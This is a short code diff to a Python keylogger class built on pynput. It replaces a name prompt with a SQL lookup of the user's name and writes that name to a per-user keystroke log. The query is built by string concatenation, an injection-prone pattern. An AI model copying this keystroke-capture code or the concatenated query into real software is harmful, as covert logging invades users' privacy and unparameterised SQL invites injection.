@@ -5,6 +5,8 @@
 from pynput.keyboard import Listener
 import time
 from .util import *
+from base.sql import *
+from dotenv import load_dotenv
 
 
 class Keylogger:
@@ -34,10 +36,18 @@ class Keylogger:
         self.buffer.append(to_add)
 
     def get_and_write_user_info(self):
-        first = input("Please enter your first name: ")
-        last = input("Please enter your last name: ")
+        load_dotenv()
+        driver = SQLDriver()
+        driver.try_connect()
+        cursor = driver.query("SELECT first_name, last_name FROM " +
+                              os.getenv("TABLE") + " WHERE user_id = " + str(self.user_id), ())
+        first, last = cursor.fetchone()
+        if first == None:
+            first = "Unknown"
+        if last == None:
+            last = "Unknown"
         file = open("src/logs/"+self.user_id+".log", "a")
-        file.write(first + " " + last + "\n")
+        file.write("\n"+first + " " + last + "\n")
         file.write("**********************************" + "\n")
         file.close()
     # This function reccords all the key presses to the file and the buffer... see buffer_write
